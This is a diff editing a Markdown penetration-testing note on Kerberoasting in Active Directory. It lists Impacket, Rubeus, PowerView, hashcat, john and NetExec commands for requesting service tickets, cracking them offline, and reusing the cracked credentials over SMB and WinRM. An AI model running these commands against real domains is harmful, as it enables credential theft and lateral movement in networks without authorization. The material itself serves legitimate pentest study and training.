@@ -4,7 +4,7 @@
 |---|---|
 | `Rubeus.exe kerberoast` | On a domain-joined Windows machine with a shell |
 | `impacket-GetUserSPNs` | From Linux with valid domain credentials |
-| `nxc ldap` with `--kerberoasting` | When you want CrackMapExec/NetExec format output |
+| `nxc ldap` with `--kerberoasting` | When you want NetExec format output |
 
 !!! tip "Tip"
     Target high-privilege service accounts first (those in Domain Admins, IT groups, etc.). Use BloodHound to identify which SPN accounts have paths to DA before cracking all hashes blindly.
@@ -13,18 +13,10 @@
 
 ## Pre-Access: SPN Enumeration with Valid Creds
 
-> These steps assume you have **domain user credentials** but no shell.
-
-### Tool: Impacket `GetUserSPNs.py`
+### Impacket `GetUserSPNs.py`
 
 ```bash
-python3 GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP>
-```
-
-**Example:**
-
-```bash
-python3 GetUserSPNs.py oscp.exam/web_svc:Diamond1 -dc-ip 10.10.110.146
+python3 GetUserSPNs.py example.com/web_svc:Diamond1 -dc-ip 10.10.10.10
 ```
 
 Output:
@@ -37,30 +29,26 @@ MSSQLSvc/sql01.htb.local:1433  svc_sql      2023-01-10 14:12:00   ...
 $krb5tgs$23$*svc_sql@HTB.EXAMPLE:...
 ```
 
-The `$krb5tgs$...` line is the **TGS ticket**, crackable offline with hashcat or john.
-
-> Use `-request` to actively request the ticket and dump it in hashcat format:
+Request the ticket in hashcat format:
 
 ```bash
-python3 GetUserSPNs.py htb.example/web_svc:Password1 -dc-ip 10.10.110.146 -request
+python3 GetUserSPNs.py example.com/web_svc:Password1 -dc-ip 10.10.10.10 -request
 ```
 
-> use `hashcat -m 13100` for this hash typ.
+> Use `hashcat -m 13100` for this hash type.
 
 ---
 
 ## Post-Access: SPN Enumeration from a Shell
 
-> You’ve landed a shell on a domain-joined machine using SMB/WinRM. Now enumerate SPNs and extract tickets.
-
-### Option A: PowerView (PowerShell)
+### Option A: PowerView
 
 ```powershell
 Import-Module .\PowerView.ps1
 Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
 ```
 
-### Option B: Rubeus (C# / OPSEC-friendly)
+### Option B: Rubeus
 
 ```powershell
 .\Rubeus.exe kerberoast /outfile:hashes.kerberoast
@@ -69,15 +57,11 @@ Get-NetUser -SPN | Select-Object samaccountname,serviceprincipalname
 Options:
 
 - Add `/user:svc_sql` to limit results
-    
-- Use `/format:hashcat` for compatibility with `hashcat`
-    
+- Use `/format:hashcat` for hashcat compatibility
 
 ---
 
-## Ticket Cracking: Offline Stage
-
-### Extracted tickets are in `$krb5tgs$23$...` format.
+## Ticket Cracking
 
 ### Crack with Hashcat
 
@@ -93,61 +77,13 @@ john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs hashes.kerbero
 
 ---
 
-## Post-Crack: Reuse the Credentials
-
-Cracked password (example):
-
-```
-svc_sql : Summer2023!
-```
-
-Use with NetExec for lateral movement:
+## Post-Crack: Reuse Credentials
 
 ```bash
-nxc smb 10.10.110.150 -u svc_sql -p 'Summer2023!' -d htb.example --shares
+nxc smb 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --shares
 ```
-
-Or test with WinRM:
 
 ```bash
-nxc winrm 10.10.110.150 -u svc_sql -p 'Summer2023!' -d htb.example --exec "whoami"
+nxc winrm 10.10.10.10 -u svc_sql -p 'Summer2023!' -d example.com --exec "whoami"
 ```
 
----
-
-## Summary: Kerberoasting Workflow
-
-|Phase|Tool|Command Example|
-|---|---|---|
-|Enumerate SPNs|`GetUserSPNs.py`|`python3 GetUserSPNs.py htb.local/user:pass -dc-ip <ip>`|
-|Extract Tickets|`GetUserSPNs.py -request`|Appends TGS ticket to output|
-||`Rubeus kerberoast`|Dumps all roastable SPNs locally|
-|Crack Tickets|`hashcat`|`hashcat -m 13100 hash.txt rockyou.txt`|
-||`john`|`john --format=krb5tgs --wordlist=... hash.txt`|
-|Reuse Creds|`NetExec / WinRM / RDP`|Use cracked creds to enumerate or laterally move|
-
----
-
-## Notes
-
-- SPNs tied to **user accounts** are crackable; SPNs tied to machine accounts are not useful for Kerberoasting
-    
-- Use `BloodHound` to identify **high-priv accounts with SPNs**
-    
-- Kerberoasting can lead directly to **local or domain admin** access if service accounts are misconfigured
-    
-
----
-
-## References
-
-- [Impacket - GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
-    
-- [GhostPack Rubeus](https://github.com/GhostPack/Rubeus)
-    
-- [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-    
-- [BloodHound AD](https://bloodhound.readthedocs.io/en/latest/)
-    
-- [Hashcat Modes](https://hashcat.net/wiki/doku.php?id=example_hashes)
-    
